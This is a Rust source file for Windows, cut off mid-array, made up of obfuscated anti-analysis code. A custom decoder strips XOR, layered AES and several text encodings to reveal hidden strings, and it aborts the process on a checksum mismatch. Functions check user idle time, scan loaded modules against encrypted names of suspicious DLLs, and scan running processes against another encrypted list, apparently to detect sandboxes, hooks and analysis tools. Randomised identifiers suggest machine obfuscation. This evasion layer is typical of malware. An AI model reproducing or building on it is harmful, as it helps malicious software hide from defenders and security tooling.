

use std::path::Path;
use windows::Win32::Foundation::CloseHandle;
use windows::Win32::Foundation::HMODULE;
use windows::Win32::System::Diagnostics::ToolHelp::CreateToolhelp32Snapshot;
use windows::Win32::System::Diagnostics::ToolHelp::PROCESSENTRY32;
use windows::Win32::System::Diagnostics::ToolHelp::Process32First;
use windows::Win32::System::Diagnostics::ToolHelp::Process32Next;
use windows::Win32::System::Diagnostics::ToolHelp::TH32CS_SNAPPROCESS;
use windows::Win32::System::ProcessStatus::EnumProcessModulesEx;
use windows::Win32::System::ProcessStatus::GetModuleBaseNameA;
use windows::Win32::System::ProcessStatus::LIST_MODULES_ALL;
use windows::Win32::System::Registry::HKEY_LOCAL_MACHINE;
use windows::Win32::System::Registry::KEY_READ;
use windows::Win32::System::Registry::RegCloseKey;
use windows::Win32::System::Registry::RegOpenKeyExA;
use windows::Win32::System::SystemInformation::GetTickCount64;
use windows::Win32::System::Threading::GetCurrentProcess;
use windows::Win32::UI::Input::KeyboardAndMouse::GetLastInputInfo;
use windows::Win32::UI::Input::KeyboardAndMouse::LASTINPUTINFO;
use windows::core::PCSTR;

#[inline(never)]
fn checksum_dl_yg_lreiazzj(data: &[u8]) -> u64 {
    let mut a = 1u64;
    let mut b = 0u64;
    for &byte in data {
        a = (a.wrapping_add(byte as u64)) % 65521;
        b = (b.wrapping_add(a)) % 65521;
    }
    (b << 32) | a
}

fn decode_einewwforzln(encrypted: &[u8], key: &[u8], expected_sum: u64) -> &'static str {
    let s: String = {
        use aes::cipher::{BlockDecrypt, KeyInit, generic_array::GenericArray};
        use aes::{Aes128, Aes192, Aes256};
        use base85; // using base85 for base85 decoding
        use bs58; // using bs58 for base58 decoding
        use base64::{engine::general_purpose, Engine as _};

        if key.len() < 88 { return Box::leak(String::from_utf8_lossy(encrypted).to_string().into_boxed_str()); }

        let xor_key = &key[0..16];
        let aes192_key = &key[16..40];
        let aes128_key = &key[40..56];
        let aes256_key = &key[56..88];

        let mut data = encrypted.to_vec();

        let cipher256 = Aes256::new(GenericArray::from_slice(aes256_key));
        for chunk in data.chunks_mut(16){
            let mut block = GenericArray::clone_from_slice(chunk);
            cipher256.decrypt_block(&mut block);
            chunk.copy_from_slice(&block);
        }

        let cipher128 = Aes128::new(GenericArray::from_slice(aes128_key));
        for chunk in data.chunks_mut(16){
            let mut block = GenericArray::clone_from_slice(chunk);
            cipher128.decrypt_block(&mut block);
            chunk.copy_from_slice(&block);
        }

        let cipher192 = Aes192::new(GenericArray::from_slice(aes192_key));
        for chunk in data.chunks_mut(16){
            let mut block = GenericArray::clone_from_slice(chunk);
            cipher192.decrypt_block(&mut block);
            chunk.copy_from_slice(&block);
        }

        if !data.is_empty() {
            let pad_len = data[data.len() - 1] as usize;
            if pad_len <= 16 && pad_len <= data.len() {
                data.truncate(data.len() - pad_len);
            }
        }

        let xor_decoded: Vec<u8> = data.iter().enumerate().map(|(i, &b)| b ^ xor_key[i % xor_key.len()]).collect();
        let hex_str = match String::from_utf8(xor_decoded) { Ok(s) => s, Err(_) => return Box::leak("".into()) };
        let base64_bytes = match hex::decode(&hex_str) { Ok(b) => b, Err(_) => return Box::leak(hex_str.into_boxed_str()) };
        let base64_str = match String::from_utf8(base64_bytes) { Ok(s) => s, Err(_) => return Box::leak("".into()) };
        let base32_bytes = match general_purpose::STANDARD.decode(&base64_str) { Ok(b) => b, Err(_) => return Box::leak(base64_str.into_boxed_str()) };
        let base32_str = match String::from_utf8(base32_bytes) { Ok(s) => s, Err(_) => return Box::leak("".into()) };
        let base58_bytes = match base32::decode(base32::Alphabet::Rfc4648 { padding: true }, &base32_str) { Some(b) => b, None => return Box::leak(base32_str.into_boxed_str()) };
        let base58_str = match String::from_utf8(base58_bytes) { Ok(s) => s, Err(_) => return Box::leak("".into()) };
        let base85_bytes = match bs58::decode(&base58_str).into_vec() { Ok(b) => b, Err(_) => return Box::leak(base58_str.into_boxed_str()) };
        let base85_str = match String::from_utf8(base85_bytes) { Ok(s) => s, Err(_) => return Box::leak("".into()) };
        let base45_bytes = match base85::decode(&base85_str) { Ok(b) => b, Err(_) => return Box::leak(base85_str.into_boxed_str()) };
        let base45_str = match String::from_utf8(base45_bytes) { Ok(s) => s, Err(_) => return Box::leak("".into()) };

        match base45::decode(&base45_str) {
            Ok(final_bytes) => {
                let runtime_sum = checksum_dl_yg_lreiazzj(&final_bytes);
                if runtime_sum != expected_sum {
                    // Tampering detected! Simulated volatile write (to valid memory) then abort.
                    unsafe {
                        let mut dummy: u8 = 0;
                        std::ptr::write_volatile(&mut dummy, 1);
                    }
                    std::process::abort();
                }
                String::from_utf8_lossy(&final_bytes).to_string()
            },
            Err(_) => base45_str,
        }
    };
    Box::leak(s.into_boxed_str())
}

  pub fn check_user_activity () -> bool { let mut last_input_info : LASTINPUTINFO = unsafe { std :: mem :: zeroed () } ; last_input_info . cbSize = std :: mem :: size_of :: < LASTINPUTINFO > () as u32 ; let result = unsafe { GetLastInputInfo (& mut last_input_info) } ; if result . as_bool () { let last_input_tick = last_input_info . dwTime as u64 ; let current_tick = unsafe { GetTickCount64 () } ; if current_tick - last_input_tick > (58006 + 61994) { return true ; } } false } pub fn check_for_hooking () -> bool { let mut modules = [HMODULE :: default () ; (59 + 965)] ; let mut needed = 0 ; let process_handle = unsafe { GetCurrentProcess () } ; if unsafe { EnumProcessModulesEx (process_handle , modules . as_mut_ptr () , std :: mem :: size_of_val (& modules) as u32 , & mut needed , LIST_MODULES_ALL) } . is_ok () { let module_count = needed as usize / std :: mem :: size_of :: < HMODULE > () ; for i in 0 .. module_count { let mut module_name = [0u8 ; (70 + 186)] ; if unsafe { GetModuleBaseNameA (process_handle , modules [i] , & mut module_name) } > 0 { let name_len = module_name . iter () . position (| & c | c == 0) . unwrap_or (module_name . len ()) ; let name = String :: from_utf8_lossy (& module_name [.. name_len]) . to_lowercase () ; let suspicious_modules = [decode_einewwforzln (& [82 , 35 , 172 , 91 , 48 , 31 , 156 , 227 , 232 , 38 , 250 , 57 , 195 , 154 , 143 , 237 , 231 , 86 , 36 , 95 , 181 , 167 , 32 , 163 , 229 , 125 , 58 , 98 , 173 , 36 , 100 , 51 , 45 , 166 , 174 , 182 , 82 , 38 , 229 , 118 , 162 , 96 , 88 , 116 , 82 , 197 , 48 , 111 , 154 , 90 , 245 , 239 , 117 , 98 , 134 , 204 , 93 , 30 , 36 , 170 , 62 , 184 , 233 , 58 , 186 , 7 , 130 , 44 , 86 , 72 , 92 , 50 , 91 , 185 , 201 , 4 , 100 , 77 , 22 , 3 , 143 , 146 , 150 , 129 , 0 , 127 , 116 , 75 , 46 , 29 , 172 , 104 , 8 , 43 , 137 , 254 , 44 , 116 , 109 , 140 , 255 , 24 , 89 , 4 , 232 , 240 , 201 , 53 , 236 , 212 , 26 , 85 , 136 , 123 , 110 , 93 , 229 , 145 , 9 , 40 , 12 , 23 , 181 , 181 , 115 , 240 , 15 , 228 , 9 , 234 , 74 , 189 , 201 , 192 , 155 , 139 , 216 , 214 , 195 , 10 , 56 , 239 , 154 , 37] , & [158 , 107 , 109 , 184 , 200 , 144 , 68 , 249 , 93 , 11 , 209 , 65 , 51 , 80 , 144 , 25 , 66 , 63 , 3 , 60 , 254 , 185 , 82 , 237 , 253 , 1 , 170 , 139 , 63 , 125 , 211 , 221 , 5 , 105 , 219 , 134 , 69 , 113 , 70 , 133 , 160 , 193 , 0 , 246 , 85 , 47 , 200 , 201 , 216 , 224 , 139 , 236 , 223 , 108 , 53 , 49 , 233 , 53 , 122 , 248 , 7 , 54 , 176 , 164 , 39 , 172 , 14 , 47 , 51 , 149 , 88 , 221 , 30 , 49 , 6 , 16 , 64 , 26 , 40 , 255 , 251 , 108 , 40 , 129 , 164 , 103 , 115 , 94] , 28797755720778u64) , decode_einewwforzln (& [235 , 16 , 245 , 209 , 236 , 210 , 121 , 92 , 205 , 46 , 80 , 64 , 108 , 225 , 241 , 231 , 237 , 204 , 25 , 203 , 159 , 206 , 151 , 40 , 70 , 22 , 164 , 153 , 147 , 219 , 67 , 218 , 209 , 153 , 224 , 115 , 167 , 1 , 222 , 191 , 102 , 219 , 151 , 230 , 188 , 179 , 147 , 218 , 77 , 12 , 220 , 206 , 145 , 127 , 74 , 194 , 139 , 33 , 183 , 231 , 195 , 198 , 238 , 126 , 53 , 160 , 141 , 225 , 59 , 171 , 135 , 251 , 115 , 69 , 185 , 135 , 222 , 83 , 137 , 67 , 206 , 11 , 167 , 43 , 48 , 217 , 64 , 246 , 232 , 124 , 35 , 119 , 199 , 65 , 41 , 63 , 34 , 58 , 96 , 46 , 147 , 103 , 160 , 121 , 19 , 33 , 44 , 42 , 71 , 20 , 110 , 48 , 125 , 62 , 16 , 161 , 14 , 180 , 179 , 13 , 49 , 254 , 121 , 225 , 179 , 147 , 128 , 10 , 63 , 28 , 179 , 26 , 161 , 119 , 31 , 176 , 89 , 117 , 106 , 203 , 164 , 179 , 111 , 91] , & [60 , 174 , 252 , 164 , 245 , 120 , 203 , 212 , 124 , 231 , 66 , 73 , 145 , 146 , 100 , 219 , 250 , 66 , 229 , 230 , 153 , 114 , 236 , 209 , 41 , 12 , 82 , 187 , 34 , 62 , 179 , 221 , 236 , 104 , 207 , 42 , 212 , 155 , 196 , 133 , 41 , 122 , 248 , 166 , 249 , 172 , 116 , 41 , 45 , 68 , 5 , 121 , 114 , 177 , 96 , 59 , 153 , 112 , 198 , 250 , 90 , 61 , 195 , 31 , 7 , 44 , 102 , 92 , 237 , 58 , 56 , 92 , 255 , 108 , 11 , 64 , 134 , 230 , 144 , 202 , 205 , 72 , 74 , 171 , 158 , 63 , 158 , 57] , 28552942584902u64) , decode_einewwforzln (& [147 , 58 , 230 , 192 , 128 , 129 , 67 , 79 , 62 , 214 , 181 , 41 , 156 , 213 , 207 , 63 , 246 , 43 , 169 , 67 , 52 , 176 , 162 , 159 , 80 , 123 , 3 , 159 , 213 , 178 , 118 , 210 , 243 , 243 , 42 , 184 , 92 , 154 , 69 , 29 , 80 , 220 , 150 , 203 , 82 , 31 , 201 , 5 , 149 , 37 , 85 , 24 , 196 , 26 , 132 , 119 , 242 , 114 , 104 , 18 , 119 , 167 , 228 , 60 , 187 , 200 , 223 , 255 , 160 , 254 , 152 , 214 , 101 , 128 , 35 , 254 , 9 , 44 , 171 , 44 , 210 , 19 , 155 , 218 , 61 , 99 , 25 , 233 , 42 , 113 , 232 , 163 , 53 , 141 , 94 , 196 , 59 , 85 , 192 , 153 , 40 , 85 , 119 , 191 , 221 , 64 , 117 , 153 , 139 , 144 , 139 , 121 , 168 , 14 , 228 , 34 , 185 , 59 , 101 , 113 , 83 , 14 , 130 , 187 , 49 , 137 , 124 , 0 , 151 , 179 , 210 , 167 , 192 , 149 , 178 , 159 , 177 , 85 , 250 , 251 , 209 , 97 , 27 , 82 , 204 , 226 , 21 , 24 , 101 , 125 , 43 , 131 , 238 , 231 , 159 , 198 , 8 , 197 , 138 , 109] , & [195 , 43 , 71 , 125 , 113 , 146 , 168 , 229 , 66 , 155 , 5 , 107 , 206 , 95 , 95 , 190 , 126 , 172 , 101 , 105 , 163 , 115 , 35 , 51 , 9 , 2 , 87 , 216 , 24 , 99 , 135 , 91 , 217 , 55 , 150 , 203 , 193 , 205 , 183 , 126 , 152 , 179 , 244 , 127 , 13 , 135 , 186 , 70 , 46 , 133 , 1 , 81 , 92 , 191 , 103 , 49 , 85 , 67 , 212 , 129 , 191 , 166 , 72 , 154 , 134 , 244 , 248 , 55 , 103 , 26 , 225 , 161 , 85 , 91 , 242 , 35 , 200 , 4 , 153 , 225 , 15 , 15 , 69 , 13 , 247 , 100 , 2 , 98] , 40192303957280u64) , decode_einewwforzln (& [190 , 6 , 240 , 158 , 85 , 163 , 96 , 134 , 208 , 209 , 61 , 85 , 187 , 50 , 100 , 113 , 75 , 88 , 137 , 204 , 9 , 80 , 79 , 49 , 201 , 13 , 182 , 206 , 180 , 168 , 228 , 91 , 245 , 118 , 242 , 217 , 82 , 231 , 201 , 96 , 9 , 186 , 10 , 233 , 66 , 233 , 60 , 48 , 210 , 197 , 127 , 44 , 24 , 155 , 86 , 52 , 178 , 207 , 96 , 146 , 177 , 177 , 108 , 121 , 81 , 84 , 198 , 130 , 135 , 180 , 64 , 117 , 219 , 150 , 128 , 250 , 6 , 168 , 67 , 135 , 165 , 110 , 169 , 239 , 100 , 45 , 199 , 179 , 179 , 1 , 165 , 22 , 3 , 135 , 23 , 56 , 165 , 50 , 129 , 175 , 156 , 97 , 36 , 39 , 60 , 86 , 216 , 174 , 190 , 239 , 25 , 49 , 197 , 109 , 7 , 97 , 44 , 209 , 62 , 162 , 103 , 4 , 220 , 207 , 94 , 29 , 134 , 121 , 114 , 135 , 29 , 244 , 71 , 116 , 15 , 74 , 97 , 166 , 156 , 52 , 236 , 32 , 38 , 186] , & [173 , 1 , 186 , 121 , 43 , 223 , 16 , 122 , 99 , 28 , 147 , 238 , 146 , 247 , 56 , 53 , 22 , 50 , 113 , 255 , 249 , 16 , 108 , 129 , 6 , 127 , 44 , 130 , 42 , 230 , 101 , 133 , 65 , 21 , 88 , 39 , 230 , 83 , 216 , 10 , 182 , 120 , 172 , 170 , 73 , 26 , 238 , 246 , 127 , 227 , 226 , 247 , 139 , 45 , 57 , 225 , 100 , 74 , 42 , 79 , 75 , 233 , 107 , 82 , 85 , 159 , 204 , 33 , 88 , 12 , 252 , 252 , 17 , 230 , 221 , 51 , 177 , 209 , 191 , 77 , 33 , 174 , 139 , 178 , 30 , 63 , 159 , 90] , 30202210026603u64) , decode_einewwforzln (& [108 , 218 , 111 , 0 , 95 , 131 , 205 , 171 , 80 , 34 , 174 , 114 , 160 , 137 , 36 , 24 , 8 , 229 , 211 , 14 , 254 , 108 , 237 , 152 , 61 , 9 , 180 , 252 , 157 , 38 , 168 , 59 , 124 , 84 , 216 , 181 , 105 , 102 , 27 , 0 , 204 , 153 , 1 , 10 , 191 , 151 , 143 , 166 , 247 , 234 , 204 , 110 , 31 , 8 , 224 , 104 , 89 , 222 , 99 , 23 , 68 , 87 , 238 , 253 , 29 , 191 , 224 , 214 , 158 , 175 , 170 , 55 , 189 , 67 , 138 , 228 , 91 , 245 , 45 , 140 , 217 , 83 , 202 , 253 , 97 , 236 , 204 , 8 , 157 , 201 , 159 , 75 , 23 , 64 , 73 , 68 , 79 , 96 , 54 , 142 , 126 , 218 , 117 , 221 , 202 , 48 , 123 , 153 , 99 , 44 , 90 , 138 , 167 , 201 , 212 , 40 , 125 , 198 , 29 , 78 , 199 , 104 , 186 , 159 , 73 , 64 , 129 , 249 , 136 , 67 , 111 , 242 , 227 , 20 , 206 , 96 , 95 , 215 , 231 , 163 , 54 , 176 , 69 , 108] , & [20 , 85 , 201 , 184 , 251 , 243 , 1 , 107 , 58 , 104 , 167 , 171 , 209 , 159 , 243 , 82 , 57 , 146 , 146 , 58 , 132 , 53 , 247 , 182 , 143 , 179 , 133 , 197 , 155 , 85 , 111 , 127 , 114 , 251 , 148 , 9 , 241 , 73 , 198 , 171 , 206 , 217 , 235 , 75 , 40 , 122 , 51 , 42 , 164 , 134 , 202 , 95 , 170 , 88 , 33 , 130 , 190 , 117 , 56 , 39 , 218 , 207 , 103 , 43 , 97 , 183 , 81 , 188 , 200 , 99 , 177 , 240 , 212 , 96 , 6 , 245 , 26 , 59 , 232 , 147 , 99 , 70 , 165 , 210 , 128 , 21 , 48 , 16] , 29059748725836u64) , decode_einewwforzln (& [63 , 208 , 137 , 53 , 79 , 177 , 82 , 118 , 217 , 13 , 210 , 231 , 241 , 97 , 71 , 32 , 74 , 221 , 80 , 15 , 157 , 70 , 147 , 150 , 215 , 124 , 35 , 192 , 73 , 189 , 34 , 207 , 5 , 41 , 20 , 226 , 94 , 122 , 75 , 200 , 178 , 60 , 11 , 128 , 190 , 58 , 55 , 24 , 103 , 50 , 21 , 88 , 245 , 189 , 246 , 118 , 70 , 29 , 123 , 127 , 64 , 101 , 230 , 219 , 194 , 142 , 44 , 5 , 239 , 74 , 213 , 133 , 187 , 43 , 25 , 175 , 7 , 92 , 220 , 165 , 115 , 146 , 223 , 252 , 218 , 228 , 191 , 65 , 143 , 52 , 167 , 49 , 78 , 19 , 191 , 118 , 30 , 168 , 105 , 232 , 254 , 239 , 108 , 66 , 88 , 217 , 6 , 132 , 135 , 211 , 105 , 252 , 77 , 158 , 103 , 104 , 168 , 178 , 251 , 54 , 97 , 123 , 171 , 19 , 92 , 69 , 135 , 119 , 159 , 247 , 135 , 41 , 180 , 254 , 199 , 65 , 124 , 95 , 220 , 3 , 116 , 230 , 27 , 134] , & [208 , 55 , 204 , 248 , 56 , 154 , 96 , 0 , 89 , 83 , 29 , 160 , 178 , 152 , 22 , 107 , 230 , 89 , 67 , 28 , 165 , 164 , 70 , 128 , 60 , 212 , 121 , 80 , 63 , 217 , 52 , 147 , 146 , 255 , 95 , 244 , 226 , 54 , 190 , 181 , 68 , 96 , 169 , 109 , 215 , 171 , 55 , 113 , 222 , 89 , 85 , 198 , 11 , 76 , 237 , 51 , 195 , 128 , 215 , 77 , 211 , 36 , 18 , 206 , 138 , 121 , 211 , 114 , 148 , 148 , 99 , 32 , 128 , 7 , 203 , 145 , 16 , 61 , 220 , 1 , 118 , 68 , 185 , 133 , 242 , 31 , 36 , 83] , 25366076851219u64) ,] ; for suspicious in suspicious_modules { if name . contains (suspicious) { return true ; } } } } } false } pub fn check_processes () -> bool { let suspicious_processes = [decode_einewwforzln (& [200 , 70 , 249 , 78 , 53 , 43 , 215 , 198 , 122 , 180 , 0 , 22 , 10 , 89 , 42 , 144 , 53 , 250 , 143 , 79 , 12 , 128 , 221 , 201 , 146 , 22 , 74 , 134 , 147 , 132 , 38 , 233 , 29 , 85 , 149 , 177 , 186 , 224 , 245 , 11 , 96 , 166 , 126 , 11 , 175 , 249 , 7 , 138 , 132 , 65 , 137 , 241 , 71 , 35 , 216 , 176 , 145 , 59 , 19 , 7 , 6 , 2 , 179 , 87 , 240 , 184 , 154 , 13 , 88 , 60 , 217 , 69 , 181 , 248 , 205 , 227 , 130 , 172 , 169 , 73 , 137 , 20 , 100 , 160 , 209 , 27 , 110 , 242 , 196 , 108 , 188 , 24 , 207 , 139 , 246 , 225 , 178 , 34 , 155 , 233 , 85 , 41 , 230 , 135 , 87 , 180 , 163 , 241 , 215 , 28 , 174 , 255 , 118 , 234 , 94 , 196 , 5 , 228 , 136 , 154 , 21 , 179 , 186 , 38 , 221 , 239 , 50 , 22 , 101 , 65 , 82 , 213 , 215 , 52 , 69 , 18 , 189 , 111 , 166 , 58 , 222 , 31 , 154 , 224 , 252 , 84 , 49 , 192 , 73 , 249 , 27 , 27 , 56 , 99 , 39 , 219 , 179 , 44 , 30 , 124] , & [219 , 101 , 218 , 40 , 20 , 142 , 189 , 2 , 218 , 220 , 24 , 92 , 120 , 247 , 24 , 77 , 136 , 213 , 150 , 213 , 147 , 0 , 249 , 69 , 118 , 143 , 7 , 136 , 142 , 65 , 186 , 146 , 193 , 64 , 213 , 16 , 155 , 230 , 4 , 146 , 70 , 36 , 154 , 27 , 253 , 3 , 10 , 232 , 60 , 247 , 131 , 123 , 152 , 139 , 36 , 215 , 159 , 182 , 144 , 135 , 112 , 199 , 54 , 222 , 44 , 38 , 135 , 46 , 27 , 14 , 206 , 199 , 80 , 226 , 165 , 105 , 112 , 181 , 203 , 78 , 195 , 214 , 83 , 122 , 226 , 30 , 75 , 60] , 36236639077616u64) , decode_einewwforzln (& [66 , 75 , 211 , 62 , 101 , 149 , 42 , 13 , 191 , 139 , 225 , 41 , 175 , 179 , 163 , 3 , 209 , 133 , 148 , 83 , 212 , 67 , 216 , 198 , 176 , 212 , 141 , 153 , 217 , 32 , 154 , 32 , 26 , 139 , 139 , 242 , 155 , 114 , 153 , 182 , 136 , 73 , 178 , 75 , 146 , 46 , 151 , 230 , 104 , 108 , 165 , 39 , 25 , 222 , 33 , 169 , 29 , 244 , 201 , 162 , 239 , 132 , 238 , 152 , 106 , 156 , 58 , 30 , 197 , 118 , 156 , 168 , 238 , 165 , 162 , 180 , 174 , 197 , 241 , 180 , 165 , 102 , 116 , 149 , 76 , 156 , 80 , 67 , 25 , 75 , 131 , 14 , 231 , 44 , 87 , 83 , 85 , 190 , 53 , 165 , 215 , 182 , 222 , 51 , 233 , 94 , 211 , 169 , 22 , 172 , 123 , 129 , 197 , 181 , 176 , 215 , 139 , 149 , 173 , 33 , 114 , 58 , 153 , 174 , 213 , 214 , 17 , 219 , 14 , 125 , 28 , 62 , 24 , 97 , 134 , 103 , 117 , 194 , 252 , 163 , 174 , 158 , 91 , 93 , 170 , 2 , 234 , 85 , 17 , 243 , 204 , 85 , 10 , 123 , 150 , 161 , 232 , 128 , 133 , 248] , & [52 , 140 , 176 , 16 , 253 , 211 , 32 , 10 , 71 , 5 , 235 , 84 , 28 , 128 , 72 , 206 , 15 , 241 , 186 , 186 , 100 , 168 , 141 , 211 , 222 , 216 , 0 , 42 , 225 , 152 , 44 , 205 , 214 , 4 , 178 , 61 , 158 , 29 , 101 , 17 , 127 , 220 , 91 , 169 , 123 , 30 , 198 , 144 , 79 , 236 , 202 , 246 , 232 , 175 , 74 , 254 , 12 , 121 , 133 , 108 , 2 , 23 , 183 , 193 , 87 , 148 , 14 , 135 , 230 , 50 , 199 , 162 , 48 , 131 , 193 , 5 , 78 , 42 , 197 , 139 , 183 , 138 , 249 , 56 , 3 , 108 , 237 , 126] , 36283883717865u64) , decode_einewwforzln (& [157 , 228 , 136 , 125 , 252 , 130 , 84 , 118 , 56 , 250 , 237 , 226 , 161 , 168 , 30 , 92 , 27 , 141 , 31 , 206 , 138 , 59 , 73 , 188 , 139 , 178 , 160 , 13 , 89 , 217 , 15 , 22 , 104 , 113 , 182 , 79 , 66 , 80 , 139 , 88 , 253 , 242 , 70 , 87 , 182 , 81 , 122 , 0 , 204 , 89 , 37 , 151 , 65 , 202 , 223 , 175 , 32 , 108 , 97 , 46 , 179 , 163 , 205 , 220 , 102 , 121 , 80 , 70 , 191 , 90 , 5 , 223 , 127 , 250 , 38 , 248 , 79 , 223 , 224 , 162 , 120 , 231 , 129 , 121 , 24 , 192 , 143 , 27 , 101 , 115 , 193 , 208 , 72 , 46 , 110 , 86 , 85 , 12 , 34 , 163 , 243 , 6 , 106 , 81 , 131 , 2 , 221 , 207 , 165 , 126 , 86 , 102 , 159 , 225 , 2 , 60 , 193 , 102 , 220 , 199 , 143 , 144 , 147 , 3 , 236 , 51 , 47 , 11 , 70 , 186 , 132 , 165 , 144 , 185 , 218 , 169 , 69 , 111 , 242 , 169 , 185 , 202 , 209 , 173 , 237 , 249 , 154 , 21 , 61 , 39 , 194 , 4 , 181 , 47 , 85 , 101 , 77 , 79 , 180 , 24 , 52 , 86 , 178 , 18 , 179 , 29 , 154 , 144 , 4 , 166 , 144 , 224 , 140 , 46 , 163 , 124 , 203 , 202 , 205 , 128 , 59 , 223 , 173 , 19 , 79 , 200 , 55 , 28 , 153 , 16 , 200 , 141] , & [12 , 198 , 115 , 225 , 250 , 0 , 111 , 59 , 230 , 183 , 73 , 125 , 207 , 145 , 238 , 227 , 214 , 194 , 154 , 82 , 255 , 131 , 43 , 230 , 32 , 3 , 89 , 186 , 194 , 180 , 28 , 117 , 184 , 132 , 198 , 100 , 111 , 131 , 72 , 224 , 167 , 26 , 36 , 166 , 122 , 174 , 63 , 178 , 235 , 55 , 4 , 106 , 104 , 37 , 13 , 67 , 5 , 6 , 55 , 185 , 84 , 58 , 56 , 215 , 223 , 113 , 75 , 31 , 139 , 146 , 48 , 220 , 40 , 184 , 112 , 123 , 83 , 35 , 147 , 183 , 196 , 191 , 240 , 155 , 77 , 225 , 156 , 2] , 48825188222403u64) , decode_einewwforzln (& [146 , 119 , 78 , 75 , 247 , 110 , 131 , 241 , 249 , 238 , 69 , 200 , 77 , 181 , 131 , 165 , 126 , 134 , 129 , 214 , 27 , 106 , 134 , 190 , 16 , 132 , 114 , 85 , 219 , 11 , 118 , 157 , 48 , 44 , 158 , 73 , 211 , 218 , 105 , 204 , 130 , 166 , 46 , 255 , 127 , 49 , 25 , 40 , 255 , 102 , 233 , 212 , 248 , 32 , 183 , 183 , 53 , 86 , 66 , 19 , 73 , 195 , 94 , 172 , 107 , 169 , 174 , 238 , 163 , 28 , 238 , 71 , 133 , 42 , 46 , 9 , 170 , 124 , 93 , 51 , 240 , 215 , 8 , 238 , 205 , 188 , 113 , 170 , 245 , 55 , 88 , 159 , 140 , 53 , 154 , 45 , 12 , 80 , 171 , 54 , 131 , 66 , 108 , 97 , 151 , 232 , 51 , 64 , 144 , 239 , 44 , 82 , 37 , 238 , 203 , 151 , 214 , 48 , 158 , 116 , 43 , 90 , 26 , 222 , 79 , 238 , 211 , 155 , 35 , 162 , 7 , 28 , 117 , 103 , 202 , 220 , 147 , 87 , 175 , 83 , 193 , 8 , 138 , 204] , & [157 , 144 , 184 , 246 , 244 , 47 , 97 , 187 , 64 , 60 , 165 , 163 , 86 , 67 , 90 , 108 , 249 , 18 , 6 , 159 , 152 , 97 , 111 , 84 , 203 , 39 , 131 , 67 , 88 , 228 , 125 , 35 , 100 , 158 , 92 , 50 , 239 , 75 , 136 , 210 , 23 , 184 , 139 , 46 , 68 , 109 , 197 , 166 , 108 , 110 , 15 , 76 , 210 , 184 , 142 , 136 , 71 , 220 , 129 , 162 , 4 , 249 , 135 , 59 , 12 , 122 , 250 , 245 , 74 , 88 , 175 , 215 , 176 , 189 , 230 , 97 , 74 , 168 , 156 , 38 , 193 , 176 , 167 , 175 , 170 , 34 , 42 , 123] , 29983166694511u64) , decode_einewwforzln (& [109 , 252 , 172 , 103 , 102 , 65 , 197 , 156 , 95 , 228 , 38 , 16 , 10 , 42 , 31 , 153 , 235 , 177 , 37 , 180 , 143 , 241 , 74 , 240 , 3 , 151 , 75 , 124 , 222 , 74 , 232 , 58 , 34 , 121 , 146 , 76 , 111 , 87 , 136 , 51 , 57 , 96 , 170 , 205 , 94 , 193 , 79 , 240 , 43 , 4 , 6 , 131 , 53 , 135 , 54 , 220 , 27 , 39 , 224 , 120 , 112 , 241 , 149 , 254 , 140 , 244 , 30 , 210 , 137 , 177 , 10 , 226 , 23 , 41 , 39 , 220 , 22 , 164 , 129 , 31 , 15 , 113 , 175 , 48 , 105 , 116 , 166 , 183 , 231 , 9 , 72 , 120 , 180 , 229 , 40 , 224 , 231 , 78 , 17 , 85 , 177 , 185 , 119 , 143 , 183 , 89 , 184 , 74 , 114 , 223 , 124 , 161 , 154 , 198 , 140 , 96 , 252 , 88 , 254 , 151 , 149 , 112 , 150 , 159 , 48 , 243 , 59 , 250 , 177 , 6 , 146 , 53 , 171 , 19 , 125 , 194 , 194 , 9 , 42 , 62 , 67 , 31 , 197 , 209] , & [173 , 159 , 175 , 102 , 70 , 47 , 33 , 35 , 94 , 206 , 28 , 52 , 100 , 141 , 92 , 199 , 226 , 140 , 126 , 7 , 127 , 117 , 156 , 183 , 155 , 149 , 220 , 156 , 136 , 5 , 204 , 208 , 100 , 52 , 183 , 52 , 239 , 102 , 0 , 223 , 70 , 6 , 80 , 83 , 114 , 62 , 164 , 177 , 29 , 129 , 231 , 78 , 128 , 183 , 217 , 209 , 12 , 63 , 197 , 121 , 230 , 50 , 176 , 165 , 205 , 43 , 240 , 98 , 116 , 186 , 92 , 245 , 10 , 8 , 61 , 17 , 38 , 193 , 243 , 31 , 114 , 33 , 190 , 99 , 91 , 146 , 220 , 150] , 24438363915257u64) , decode_einewwforzln (& [49 , 25 , 22 , 104 , 121 , 126 , 10 , 10 , 77 , 218 , 206 , 117 , 89 , 197 , 107 , 66 , 143 , 80 , 4 , 117 , 153 , 160 , 243 , 221 , 218 , 104 , 236 , 236 , 56 , 243 , 115 , 165 , 29 , 75 , 125 , 168 , 122 , 51 , 178 , 65 , 71 , 65 , 241 , 89 , 15 , 205 , 129 , 4 , 96 , 107 , 46 , 89 , 153 , 208 , 254 , 125 , 180 , 221 , 4 , 88 , 110 , 178 , 11 , 99 , 88 , 16 , 120 , 105 , 111 , 146 , 41 , 149 , 79 , 117 , 12 , 205 , 105 , 82 , 204 , 108 , 128 , 29 , 185 , 164 , 50 , 85 , 206 , 105 , 178 , 40 , 250 , 53 , 67 , 151 , 74 , 165 , 75 , 66 , 212 , 123 , 9 , 44 , 176 , 48 , 73 , 53 , 203 , 243 , 208 , 93 , 116 , 38 , 136 , 34 , 94 , 192 , 56 , 230 , 147 , 114 , 65 , 98 , 99 , 33 , 88 , 163 , 80 , 9 , 159 , 89 , 42 , 243 , 123 , 2 , 129 , 228 , 180 , 222 , 234 , 81 , 113 , 125 , 202 , 134 , 147 , 228 , 121 , 215 , 32 , 21 , 1 , 193 , 184 , 202 , 151 , 18 , 195 , 121 , 115 , 254] , & [62 , 142 , 203 , 174 , 164 , 200 , 49 , 17 , 170 , 29 , 75 , 133 , 136 , 236 , 89 , 0 , 30 , 227 , 212 , 234 , 209 , 123 , 251 , 82 , 85 , 200 , 134 , 155 , 228 , 57 , 149 , 169 , 75 , 181 , 7 , 130 , 74 , 184 , 144 , 83 , 77 , 240 , 147 , 101 , 208 , 165 , 29 , 185 , 5 , 101 , 159 , 175 , 244 , 66 , 67 , 119 , 219 , 237 , 208 , 53 , 176 , 154 , 149 , 138 , 194 , 64 , 94 , 17 , 147 , 120 , 200 , 163 , 60 , 46 , 226 , 101 , 91 , 84 , 238 , 250 , 241 , 214 , 71 , 5 , 56 , 98 , 100 , 17] , 41562398524737u64) , decode_einewwforzln (& [2 , 82 , 124 , 27 , 220 , 18 , 16 , 170 , 220 , 234 , 148 , 144 , 67 , 6 , 53 , 118 , 224 , 100 , 254 , 26 , 215 , 77 , 5 , 166 , 247 , 158 , 197 